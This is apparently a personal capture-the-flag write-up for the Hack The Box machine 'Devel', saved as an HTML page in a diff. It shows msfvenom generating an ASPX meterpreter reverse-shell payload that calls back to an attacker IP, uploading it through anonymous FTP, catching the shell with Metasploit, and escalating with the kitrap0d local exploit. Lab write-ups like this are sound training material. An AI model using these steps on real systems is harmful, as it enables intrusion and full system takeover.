@@ -1,0 +1,59 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Devel</title>
+</head><body><span style="font-size: 14pt">Nmap<ul><li style="list-style-type: none">- Had port 21(FTP) &lt;-- with anonymous login</li>
+<li style="list-style-type: none">-Files on FTP server</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><img height="67" src="image.png" width="350"/></li>
+</ul>
+</li>
+</ul>
+</li>
+<li style="list-style-type: none">- Had port 80 (webserver)</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">- can access file on FTP server (http://10.10.10.5/welcome.png    &lt;- pulls welcome.png from ftp)</li>
+</ul>
+</li>
+</ul>
+<br/>
+Creates rever shell to execute on FTP server (<div style="text-align: left"><span style="font-family: Roboto">Active Server Page Extended </span></div><b>file</b>)<br/>
+&gt;&gt; msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.191 LPORT=4444 -f aspx &gt; exploit.aspx<br/>
+</span><br/>
+<br/>
+<span style="font-size: 16pt">Put file on FTP server<br/>
+ftp&gt; put exploit.aspx<br/>
+<br/>
+Start listener<ul><li style="list-style-type: none">msf&gt; use exploit/multi.handler</li>
+<li style="list-style-type: none">msf&gt; set payload windows/meterpreter/reverse_tcp</li>
+<li style="list-style-type: none">msf&gt; run</li>
+</ul>
+<br/>
+<br/>
+Visit Webpage for execution<ul><li style="list-style-type: none">http://10.10.10.5:80/exploit.aspx</li>
+<li style="list-style-type: none"/>
+<li style="list-style-type: none"/>
+</ul>
+----------------Nice you got yourself a shell-------------------<br/>
+meterpreter&gt; getuid<br/>
+&gt;&gt;Server username: IIS APPPOOL\Web  &lt;-- means no authority<br/>
+meterpreter&gt; sysinfo<br/>
+&gt;&gt;Computer    		: DEVEL<br/>
+&gt;&gt;OS         		: Windows 7 (6.1 Build 7600).<br/>
+&gt;&gt;Architecture  		: x86<br/>
+&gt;&gt;System Language 	: el_GR<br/>
+&gt;&gt;Domain     		: HTB<br/>
+&gt;&gt;Logged On Users 	: 0<br/>
+&gt;&gt;Meterpreter   		: x86/windows<br/>
+<br/>
+======================================================<br/>
+</span><span style="font-size: 18pt">Metasploit</span><span style="font-size: 16pt"><br/>
+</span><span style="font-size: 16pt">Upgrade the shell<br/>
+meterpreter&gt; run post/multi/recon/local_exploit_suggester <ul><li style="list-style-type: none">- found --&gt; /windows/local/ms10_015_kitrap0d</li>
+</ul>
+-background session 1<br/>
+<br/>
+msf&gt; use exploit/windows/local/ms10_015_kitrap0d<br/>
+msf&gt; set session 1<br/>
+msf&gt; set LPORT &lt;any other unused port&gt;<br/>
+<br/>
+<img src="image 2.png"/>   &lt;-- UPGRADED SESSION <br/>
+</span></body></html>
